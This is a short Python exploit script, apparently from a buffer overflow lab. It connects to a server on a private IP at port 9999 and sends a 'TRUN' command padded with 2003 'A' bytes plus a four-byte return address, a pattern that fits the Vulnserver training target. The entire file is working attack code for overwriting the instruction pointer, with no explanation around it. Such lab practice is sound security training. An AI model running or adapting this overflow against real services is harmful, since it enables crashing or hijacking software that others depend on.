#!/usr/bin/python
import sys 
import socket 

shell_code = 'A' * 2003 + "\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.17.134', 9999))

	s.send(('TRUN /.:/' + shell_code))
	s.close()
except:
	print("Error connecting to server!")
	sys.exit()
		
				
		
